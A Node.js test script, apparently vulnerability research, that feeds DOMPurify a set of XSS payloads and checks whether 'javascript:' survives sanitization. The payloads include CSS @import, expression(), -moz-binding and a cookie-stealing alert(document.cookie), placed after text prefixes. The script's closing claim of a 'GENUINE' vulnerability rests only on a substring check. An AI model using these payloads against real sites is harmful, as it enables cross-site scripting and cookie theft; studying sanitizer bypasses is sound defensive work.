"use strict";

const path = require("path");
const { JSDOM } = require("jsdom");
const DOMPurify = require("dompurify");
const TARGETS_DIR = path.resolve(__dirname, "..", "..", "targets");
const dompurifyPkg = require(path.join(TARGETS_DIR, "node_modules", "dompurify", "package.json"));

const window = new JSDOM("").window;
const purify = DOMPurify(window);

function test(name, input) {
  const out = purify.sanitize(input);
  const has = out.includes("javascript:");
  console.log(`${has ? "BYPASS" : "blocked"} | ${name}`);
  return has;
}

const payload = '<style>@import url("javascript:void(0)");</style>';

console.log("=== DOMPurify CSS @import bypass: TEXT PREFIX CONDITION ===\n");
console.log("DOMPurify version:", dompurifyPkg.version);
console.log();

console.log("--- Text prefixes ---");
test("no prefix", payload);
test("single char 'a'", "a" + payload);
test("single space", " " + payload);
test("newline", "\n" + payload);
test("tab", "\t" + payload);
test("zero-width space \\u200B", "\u200B" + payload);
test("NBSP \\xA0", "\xA0" + payload);

console.log("\n--- HTML element prefixes ---");
test("<p>text</p> before", "<p>text</p>" + payload);
test("<div></div> before", "<div></div>" + payload);
test("<br> before", "<br>" + payload);
test("<span></span> before", "<span></span>" + payload);
test("<!-- comment --> before", "<!-- comment -->" + payload);
test("<title>X</title> before", "<title>X</title>" + payload);
test("<b></b> before", "<b></b>" + payload);
test("empty <div> then text then style", "<div></div>x" + payload);

console.log("\n--- Minimal reproduction ---");
test("single 'x' prefix", "x" + payload);

console.log("\n--- Payload variations ---");
test("x + @import alert(1)", 'x<style>@import url("javascript:alert(1)");</style>');
test("x + @import with expression", 'x<style>body { width: expression(alert(1)) }</style>');
test("x + bg url(javascript:)", 'x<style>body { background: url("javascript:alert(1)") }</style>');
test("x + -moz-binding", 'x<style>body { -moz-binding: url("javascript:alert(1)") }</style>');
test("x + @import data:", 'x<style>@import url("data:text/css,*{background:red}");</style>');

console.log("\n--- Real-world attack scenarios ---");
test("User comment + style", "Hello world!<style>@import url(\"javascript:alert(document.cookie)\");</style>");
test("Markdown-like text + style", "# Title\n\nParagraph text.\n<style>@import url(\"javascript:alert(1)\");</style>");
test("<img> + style", '<img src="x"><style>@import url("javascript:alert(1)");</style>');

console.log("\n=== CONCLUSION ===");
console.log("Any text/element before <style> bypasses DOMPurify CSS javascript: filtering");
console.log("This is a GENUINE sanitizer vulnerability in DOMPurify " + dompurifyPkg.version);
